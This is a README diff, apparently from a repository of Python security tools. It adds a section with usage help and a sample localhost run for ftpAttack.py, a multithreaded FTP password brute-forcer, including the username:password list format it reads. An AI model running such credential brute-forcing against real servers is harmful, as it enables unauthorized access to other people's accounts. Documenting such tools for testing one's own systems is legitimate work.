@@ -99,3 +99,38 @@ More Help: PortScan.py -h
 		[-] Testing: 123456
 		[+] Good , Key Found: 123456
 ```
+
+### ftpAttack.py 多线程ftp密码暴力破解
+```
+测试：
+➜  py python ftpAttack.py -h
+	Usage: -H <target host> -f <password list>
+
+	Options:
+	  -h, --help     show this help message and exit
+	  -H TGTHOST     specify target host
+	  -f PASSWDFILE  specify password file,like username:password format file
+	  -d DELAY       attack time delay set default 1s
+
+➜  py python ftpAttack.py -H 127.0.0.1 -f userpass.md -d 1
+
+	[-] 127.0.0.1 FTP Anonymous Logon Failed.
+	[+] Trying: root/aaa
+
+	[-] Could not brute force FTP credentials.
+
+	[+] Trying: lock/mmm
+
+	[-] Could not brute force FTP credentials.
+	[+] Trying: alice/123
+
+
+	[-] Could not brute force FTP credentials.
+
+	The default test delay time is 0s , test default account is anonymous , if success, will show user name and password.
+	userpass.md is username and password file,the file format like below:
+		root:123
+		hello:456
+		alice:789
+		test:12345
+```
